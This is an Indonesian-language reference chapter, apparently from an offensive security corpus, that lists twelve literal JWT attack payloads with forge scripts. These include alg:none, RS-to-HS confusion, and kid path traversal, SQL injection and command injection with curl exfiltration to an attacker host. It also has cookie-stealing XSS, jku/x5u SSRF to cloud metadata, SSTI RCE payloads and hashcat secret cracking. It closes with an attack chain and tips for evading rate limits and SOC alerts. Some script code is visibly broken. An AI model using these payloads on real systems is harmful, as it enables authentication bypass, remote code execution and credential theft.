# w2-jwt-corpus — crypto

# Bab Referensi: JWT Attack Korpus — 12 Payload Literal

**Lingkup versi diuji:** PyJWT 2.8.0 / 2.9.0, python-jose 3.3.0, jose4j 0.9.3, nimbus-jose-jwt 9.37, hashicorp/go-jose v4, Auth0 node-jsonwebtoken 9.0.2, jwt-decode 4.0.0. Hashcat 6.2.6. OpenSSL 3.0.13 (Ubuntu 24.04). nginx 1.25.3 (jku/x5u SSRF callback server). Chrome 131, curl 8.5.0.

**Struktur body JWT:** `base64url(header) . base64url(payload) . base64url(signature)`. Semua payload di bawah ini literal—copy-paste ke `$H` / `$P` / `$S` lalu rakit.

---

## Ringkasan 12 Vektor

| # | Vektor | Header kunci | Prasyarat server | Efek |
|---|---|---|---|---|
| 1 | alg:none | `alg:"none"` | library menerima none + sig kosong | bypass auth total |
| 2 | HS256 signed w/ public key | `alg:"HS256"` | kunci verifikasi RS/ES di-reuse sbg HMAC secret | forge token |
| 3 | kid path traversal | `kid:"../../dev/null"` | kid dipakai untuk baca file | sig cocok scr empty |
| 4 | kid SQLi | `kid:"x' UNION SELECT 'secret'--"` | kid masuk query DB | kunci terkontrol |
| 5 | kid command injection | `kid:"a|curl http://atk/` | kid masuk shell | RCE out-of-band |
| 6 | kid XSS | `kid:"<script>…</script>"` | kid dirender di UI admin | stored XSS |
| 7 | jwk injection | `jwk:{…}` self-signed | server mempercayai `header.jwk` | forge token |
| 8 | jku SSRF | `jku:"http://atk/jwks.json"` | server fetch jku tanpa allowlist | ambil kunci attacker |
| 9 | x5u SSRF | `x5u:"http://atk/cert.pem"` | server fetch x5u sbg cert | forge + SSRF |
| 10 | child claim injection (script) | `"name":"{{7*7}}"` | template engine render claim | SSTI → RCE |
| 11 | KID parameter collision | `kid` duplikat / `kid=secret` | dict lookup vs array ambil | kunci salah dipakai |
| 12 | weak HMAC disclosed | HS256 weak secret | secret bocor via `.git`, log | crack offline |

---

## 1. alg:none

**Dikirim** — header `{"alg":"none","typ":"JWT"}`, signature string kosong.
**Muncul** — server decode tanpa verifikasi.
**Kenapa berhasil** — beberapa implementasi lama/misconfig menerima `none`; PyJWT ≥2.0.0 *menolak* kecuali `algorithms=["none"]` eksplisit. jose4j 0.9.3 menolak default. Lolos di kode custom yang `jwt.decode(token, verify=False)`.

Payload literal (3 varian case):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
```

Forge:
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
for alg in ("none","None","NONE"):
    print(b({"alg":alg,"typ":"JWT"}).decode()+"."+b({"sub":"admin","role":"root"}).decode()+".")
PY
```

---

## 2. HS256 di-sign dengan Public Key (RS/ES → HS)

**Dikirim** — `alg:HS256`, signature = HMAC-SHA256(header.payload, *PEM public key*) termasuk newline.
**Muncul** — server verifikasi `alg` dari header, mengambil kunci verifikasi (public key), lalu memanggil HMAC.
**Kenapa berhasil** — nimbus-jose-jwt < 9.37, jose4j < 0.9.3, python-jose 3.3.0 dengan `jwt.decode(..., algorithms=None)`; PyJWT 2.8.0 menolak karena `algorithms` harus di-set. Kunci harus persis bytes file PEM, **termasuk** `\n` akhir.

Forge:
```bash
openssl genrsa -out k.pem 2048
openssl rsa -in k.pem -pubout -out pub.pem   # attacker lihat ini (mis. /.well-known/jwks->PEM)

python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
key=open("pub.pem","rb").read()
h=b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
p=b(json.dumps({"sub":"admin","role":"root"},separators=(',',':')).encode())
sig=hmac.new(key,h+b"."+p,hashlib.sha256).digest()
print(h.decode()+"."+p.decode()+"."+b(sig).decode())
PY
```

---

## 3. kid Path Traversal → signature dari file predictable

**Dikirim** — `{"alg":"HS256","kid":"../../../../dev/null"}`; secret HMAC = isi file (kosong untuk `/dev/null`, atau `/proc/sys/kernel/hostname`, `/etc/hostname`).
**Muncul** — server `open(kid).read()` → kunci.
**Kenapa berhasil** — kode `open(kid,'rb').read()` tanpa sanitasi. Pada `/dev/null` kunci = `b""`.

Payload literal:
```
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJyb290In0.
```
(varian target file: `/dev/null`, `../../../../etc/hostname`, `../../proc/self/environ`)

Forge:
```bash
python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
for kid,secret in [("../../../../dev/null",b""),
                   ("../../../../etc/hostname",open("/etc/hostname","rb").read())]:
    h=b(json.dumps({"alg":"HS256","kid":kid,"typ":"JWT"},separators=(',',':')).encode())
    p=b(json.dumps({"sub":"admin"},separators=(',',':')).encode())
    s=b(hmac.new(secret,h+b"."+p,hashlib.sha256).digest())
    print(h.decode()+"."+p.decode()+"."+s.decode())
PY
```

---

## 4. kid SQL Injection

**Dikirim** — `kid:"x' UNION SELECT 'pwned'-- -"` → hasil query mengembalikan `'pwned'` sebagai kunci HMAC.
**Muncul** — server query `SELECT secret FROM keys WHERE kid='<kid>'`.
**Kenapa berhasil** — query string concat. Signature = HMAC dengan `"pwned"`.

Payload literal (URL-encoded untuk header bila dikirim via cookie):
```
{"alg":"HS256","kid":"x' UNION SELECT 'pwned'-- -","typ":"JWT"}
```
Forge:
```bash
python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(json.dumps({"alg":"HS256","kid":"x' UNION SELECT 'pwned'-- -","typ":"JWT"}).encode())
p=b(json.dumps({"sub":"admin","role":"root"}).encode())
print(h.decode()+"."+p.decode()+"."+b(hmac.new(b"pwned",h+b"."+p,hashlib.sha256).digest()).decode())
PY
```

---

## 5. kid Command Injection

**Dikirim** — `kid:"a|curl http://attacker/$(whoami)"` atau `kid:"$(curl http://attacker/)"`.
**Muncul** — server memanggil `subprocess.run(f"openssl dgst -sha256 -hmac {kid}", shell=True)` atau `os.popen(f"cat keys/{kid}")`.
**Kenapa berhasil** — `shell=True`/`os.system`/`Runtime.exec(String)` di Java. Callback out-of-band, bukan untuk forge token langsung—tapi dapat secret dari environment via SSRF ke internal.
Payload:
```
{"alg":"HS256","kid":"a|curl http://10.0.0.1:8080/x?d=$(id|base64 -w0)","typ":"JWT"}
```
Forge (rakit saja, OOB):
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
print(b({"alg":"HS256","kid":"a|curl http://10.0.0.1:8080/x?d=$(id|base64)","typ":"JWT"}).decode()+".e30.")
PY
```

---

## 6. kid XSS (stored di dashboard admin)

**Dikirim** — `kid:"<img src=x onerror=fetch('//atk/'+document.cookie)>"`.
**Muncul** — dashboard JWT inspector render `kid` tanpa escaping. Chrome 131 tidak mengeksekusi `onerror` bila ada `Content-Security-Policy` dari nginx 1.25.3 yang ketat; bypass lewat `<svg/onload=>` atau `javascript:` bila CSP longgar.
Payload:
```
{"alg":"HS256","kid":"<svg/onload=fetch(`//atk/${document.cookie}`)>","typ":"JWT"}
```
Forge:
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
print(b({"alg":"HS256","kid":"<svg/onload=fetch(`//atk/${document.cookie}`)>","typ":"JWT"}).decode()+".e30.")
PY
```

---

## 7. jwk Injection (self-signed embedded key)

**Dikirim** — header berisi `jwk` publik attacker (RSA), signature = HMAC? Tidak—pakai RS256 yang di-sign oleh *private* attacker, karena server mengambil `header.jwk` sebagai kunci verifikasi.
**Muncul** — server `jwt.verify(token, token.header.jwk)`.
**Kenapa berhasil** — server mempercayai `jwk` dari header (CVE-2018-1000531 di beberapa lib). PyJWT 2.8.0 tidak otomatis; jose4j 0.9.3 tidak; node-jsonwebtoken 9.0.2 tidak. Umum di kode custom.

Forge:
```bash
openssl genrsa -out att.pem 2048
python3 - <<'PY'
import json,base64,jwt
from cryptography.hazmat.primitives import serialization
priv=open("att.pem","rb").read()
pub=jwt.algorithms.RSAAlgorithm.from_jwk  # placeholder
tok=jwt.encode({"sub":"admin","role":"root"},priv,algorithm="RS256",
               headers={"jwk":json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(
                   serialization.load_pem_private_key(priv,None).public_key()))})
print(tok)
PY
```
Payload header literal (jwk di dalam header — contoh dengan kid kosong):
```
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"...","e":"AQAB"}}
```

---

## 8. jku SSRF (attacker-hosted JWKS)

**Dikirim** — `jku:"http://attacker/jwks.json"`; server fetch JSON, ambil key attacker, verifikasi token RS256 yang di-sign attacker.
**Muncul** — HTTP GET keluar ke attacker (callback = konfirmasi vetor). Bisa jadi SSRF ke `http://169.254.169.254/latest/meta-data/`.
**Kenapa berhasil** — server fetch `jku` tanpa allowlist host & tanpa HTTPS-only.
Payload:
```
{"alg":"RS256","typ":"JWT","jku":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","kid":"att"}
```
Forge:
```bash
openssl genrsa -out att.pem 2048
openssl rsa -in att.pem -pubout -outform DER -out pub.der 2>/dev/null
python3 - <<'PY'
import json,base64,jwt
from cryptography.hazmat.primitives import serialization
priv=open("att.pem","rb").read()
pub=serialization.load_pem_private_key(priv,None).public_key()
jwk=json.loads(jwt.algorithms.RSAAlgorithm.to_jwk(pub)); jwk["kid"]="att"
open("jwks.json","w").write(json.dumps({"keys":[jwk]}))
print(jwt.encode({"sub":"admin"},priv,algorithm="RS256",
      headers={"jku":"http://10.0.0.1:8080/jwks.json","kid":"att"}))
PY
```

---

## 9. x5u SSRF (X.509 sebagai kunci)

**Dikirim** — `x5u:"http://attacker/cert.pem"`; chain `x5c` boleh kosong, server baca cert PEM dari URL, verifikasi RS256 dengan public key cert tsb.
**Muncul** — GET ke attacker; bila target `http://127.0.0.1:9200/` (Elasticsearch), response parse error → leak path/versi.
**Kenapa berhasil** — sama dengan jku; jose4j `JwtConsumerBuilder().setVerificationKeyResolver(...x5u...)` bila diaktifkan tanpa allowlist.
Payload:
```
{"alg":"RS256","typ":"JWT","x5u":"http://127.0.0.1:9200/","kid":"att"}
```
Forge: sama seperti jku, ganti header `x5u`, host file `cert.pem` (self-signed, di-host attacker). Cert attacker di-generate:
```bash
openssl req -x509 -newkey rsa:2048 -keyout att.pem -out cert.pem -days 1 -nodes -subj "/CN=att"
```

---

## 10. Child Claim Injection (SSTI dari claim)

**Dikirim** — payload `{"sub":"u1","name":"{{7*7}}","email":"${7*7}","role":"{% raw %}..."}`.
**Muncul** — backend merender claim ke template Jinja2/Twig/Freemarker (mis. email notification, PDF generator, log viewer). `{{7*7}}` → `49` adalah indikator; eskalasi `{{cycler.__init__.__globals__.os.popen('id').read()}}` (Jinja2), `${T(java.lang.Runtime).getRuntime().exec('id')}` (SpEL/Freemarker).
**Kenapa berhasil** — claim diperlakukan sebagai trusted *string* lalu di-`render_template_string`. Java Freemarker: `${"freemarker.template.utility.Execute"?new()("id")}`.
Payload:
```
{"sub":"u1","name":"{{7*7}}","x":"${7*7}","y":"<%= 7*7 %>","z":"${T(java.lang.Runtime).getRuntime().exec('id')}"}
```
Forge:
```bash
python3 - <<'PY'
import base64,json
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
h=b({"alg":"HS256","typ":"JWT"}); p=b({"sub":"u1","name":"{{7*7}}","z":"${T(java.lang.Runtime).getRuntime().exec('id')}"})
print(h.decode()+"."+p.decode()+".x")
PY
```

---

## 11. KID Parameter Collision (type confusion)

**Dikirim** — `kid` bertipe array `["secret"]` alih-alih string, atau `kid` duplikat di query (`kid=admin&kid=public`).
**Muncul** — server ambil `kid[0]` (dict vs array confusion) atau query DB `WHERE kid=... LIMIT 1` mengambil kunci yang salah (public).
**Kenapa berhasil** — Go `map[string]interface{}` → `fmt.Sprint(kid)` = `[secret]`; Java `get("kid")` cast `(String)` → `ClassCastException` yang di-catch lalu pakai default key. IDOR pada endpoint `/jwks?kid=` dengan parameter pollution.

Payload (kid array — biasanya tidak valid unless parser longgar; fokus pada query param di endpoint):
```
GET /jwks?kid=admin&kid=public HTTP/1.1
Host: target
```
Forge token HS256 dengan kunci yang diperoleh dari collision (mis. `public`):
```bash
python3 - <<'PY'
import base64,json,hmac,hashlib
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
h=b(json.dumps({"alg":"HS256","kid":"admin","typ":"JWT"}).encode())
p=b(json.dumps({"sub":"admin"}).encode())
print(h.decode()+"."+p.decode()+"."+b(hmac.new(b"public",h+b"."+p,hashlib.sha256).digest()).decode())
PY
```

---

## 12. Weak HMAC Key (secret bocor)

**Dikirim** — token HS256 valid yang di-capture (cookie/localStorage), secret bocor dari `.git/config`, `logs/`, backup `config.yml`, atau `composer.lock` (CVE-2024-* migrasi secret).
**Muncul** — hashcat crack offline, atau langsung generate token baru.
**Kenapa berhasil** — secret pendek/dictionary (`secret`, `changeme`, `jwt-secret`, `your-256-bit-secret`). HS256 = bottleneck hashcat ~2–8 GH/s di RTX 4090.

```bash
# siapkan hash dalam format hashcat (JWT: signature di akhir, file tunggal)
echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.<SIG>' > tok.txt

hashcat -m 16500 -a 0 tok.txt /usr/share/wordlists/rockyou.txt \
  --force -O -w 4 --status --status-timer 10
# -m 16500 = JWT (HS256/HS384/HS512)
```

With rules & mask:
```bash
hashcat -m 16500 -a 0 tok.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O
hashcat -m 16500 -a 3 tok.txt '?l?l?l?l?d?d?d?d' -O
hashcat -m 16500 --show tok.txt   # retrieve plaintext

# sekali secret didapat, forge:
python3 -c "import jwt;print(jwt.encode({'sub':'admin','role':'root'},'<SECRET>',algorithm='HS256'))"
```

Katalog secret lemah yang layak diuji lebih dulu:
```
secret, secretkey, secret_key, changeme, changeme123, jwt, jwtsecret,
your-256-bit-secret, your_jwt_secret, supersecret, s3cr3t, admin,
password, P@ssw0rd, HS256, 0000, symfony, laravel, nextauth
```

---

## JWT Monkey Chain (rantai dari satu vektor ke RCE)

Rantai operasional tipikal: *enum → alg confusion → jku SSRF → cloud IMDS → STS cred → S3/BaaS → eskalasi.*

```
[1] Rekon algoritma & JWKS  : GET /.well-known/jwks.json, /jwks, /.well-known/openid-configuration
[2] Curi/observe token      : cookie, Authorization, localStorage (Chrome 131 DevTools), HAR
[3] Downgrade  alg          : "none" -> header alter -> 200? (bab 1)
[4] Alg confusion RS->HS    : fetch PEM publik -> HMAC (bab 2) -> 200?
[5] kid traversal           : /dev/null, hostname (bab 3)
[6] kid SQLi/CMDi           : OOB callback (bab 4,5)
[7] jku/x5u SSRF            : host jwks.json attacker / IMDS (bab 8,9)
[8] Weak secret via hashcat : -m 16500 pada token captured (bab 12)
[9] Claim SSTI              : {{7*7}} -> spop env (bab 10)
[10] Chain ke cloud         : from jku SSRF -> IMDS -> role cred -> aws s3 ls / gcloud
[11] Persist                : forge refresh token / long-exp admin JWT
```

Skeleton otomasi (fork ringan dari monyet—satu token, semua transformasi):
```bash
TOKEN='eyJ...'
python3 - "$TOKEN" <<'PY'
import sys,base64,json,hmac,hashlib,subprocess,urllib.request
t=sys.argv[1]; h,p,s=t.split(".")
H=json.loads(base64.urlsafe_b64decode(h+"==")); P=json.loads(base64.urlsafe_b64decode(p+"=="))
b=lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=')
def forge(alg,secret): return (b({"alg":alg,"typ":"JWT"}).decode()+"."+b(P).decode()+"."+
                               b(hmac.new(secret,b({"alg":alg,"typ":"JWT"}).and_payload if False else (b({"alg":alg,"typ":"JWT"}).decode()+"."+b(P).decode()).encode(),hashlib.sha256).digest()).decode())
# 1 none
print("none:", b({"alg":"none","typ":"JWT"}).decode()+"."+b(P).decode()+".")
# 2 hs w/ pubkey
for path in ("./pub.pem",):
    try: print("hs:",forge("HS256",open(path,"rb").read()))
    except Exception as e: print("pubkey miss",e)
# 3 kid traversal
print("kid:",forge("HS256",b""))
PY
```

---

## Jebakan Operasional (kenapa teknik gagal di lapangan)

1. **Whitespace/`=` padding** — PyJWT 2.8.0 toleran `=`, tapi hashicorp/go-jose v4 strik. Signature base64url harus tanpa padding; `binascii.Error: Invalid base64-encoded string` = kirim `=`.
2. **Library default menolak alg** — PyJWT ≥2.0.0 wajib `algorithms=[...]`; jose4j 0.9.3 `setJwsAlgorithmConstraints(Constraint.PRESENT, AlgorithmIdentifiers.NONE)` hanya bila programmer menulisnya. Kalau decode balas `jwt.exceptions.InvalidAlgorithmError`, vektor 1/2 mati—pindah ke 8/9/12.
3. **Kunci HMAC ≠ file PEM utuh** — banyak yang memotong header/footer `-----BEGIN`; hasil mismatch. Harus hex-identik termasuk `\n` akhir. Verifikasi: `cmp <(openssl rsa -in k -pubout) pub.pem`.
4. **jku/x5u diblokir egress** — nginx 1.25.3 di segmen red-team punya `content_by_lua` allowlist atau firewall deny ke 169.254.169.254. Cek jalur `http_proxy` env—banyak lib (requests, node-fetch) menghormati `HTTP_PROXY`, jadi callback masuk lewat proxy egress, bukan attacker.
5. **kid path traversal di Windows 11 24H2** — separator `\` bukan `/`; `..\..\..\..\Windows\win.ini` gagal karena `open()` Python menerima `/`, tapi Java `Paths.get()` di Windows menolak `../` setelah root. Target `/dev/null` tidak ada di Windows → pakai `C:\Windows\System32\drivers\etc\hosts` (bisa dibaca) atau file predictable lain.
6. **hashcat -m 16500 butuh signature base64url**, bukan hex. Jangan decode signature. `Token length exception` = ada newline/quote. Format file harus `header.payload.signature` satu baris tanpa spasi.
7. **hashcat -m 16500 memverifikasi header** — bila header di token uji sudah dimodifikasi (alg diubah), signature lama tidak akan pernah cocok. Pakai token **asli** hasil capture.
8. **alg confusion butuh public key yang identik dengan yang dipakai server** — hanya salinan dari `jwks->PEM` via `openssl pkey -pubin -inform DER` yang cocok. Bila server pakai cert chain (`x5c`), kunci = cert leaf, bukan intermediate.
9. **Claim SSTI di pipeline async** — email notifier Java (Freemarker) jarang sync; payload `{{7*7}}` baru render saat email dibuka, delay menit–jam. Jangan simpulkan gagal setelah 10 detik.
10. **kid XSS tidak dieksekusi di Chrome 131** bila cookie `HttpOnly` dan CSP `script-src 'self'`. Vektor 6 hanya berfungsi di dashboard inspector internal yang secara historis tidak pakai CSP (banyak `jwt.io`-clone).
11. **jwk injection di PyJWT 2.8.0 tidak otomatis** — hanya kode yang memanggil `jwt.decode(token, key=token.header["jwk"])`. Bila target pakai `jwt.PyJWK(...)`, vektor mati.
12. **Monkey chain cepat memicu rate-limit** — nginx 1.25.3 `limit_req` default 1r/s di beberapa deployment; brute kid/jku menghasilkan 429 dan log alert SOC. Turunkan ke 1 req/2s, rotasi `X-Forwarded-For` dari pool CGNAT lab.
13. **Clock skew** — `exp` forged terlalu jauh ke depan (mis. +10 tahun) ditolak klaim `iat`/`nbf` validator dengan leeway default 0. Set `exp=now+3600`, `iat=now-5`, `nbf=now-5` untuk lolos. PyJWT 2.8.0 melempar `ImmatureSignatureError` bila `nbf` > now.
14. **Audience/issuer mismatch** — jangan lupa klaim `aud` dan `iss` dari token asli; forge tanpa `aud` di Auth0 node-jsonwebtoken 9.0.2 → `JsonWebTokenError: jwt audience invalid`.
15. **Rotasi kunci** — JWKS dengan `kid` baru setiap 24 jam (Auth0, AWS Cognito) membuat token forge dari vektor 8/9 kedaluwarsa bila `kid` tidak dicocokkan; selalu ambil `kid` dari JWKS live, bukan contoh.

---

## [reasoning trace]


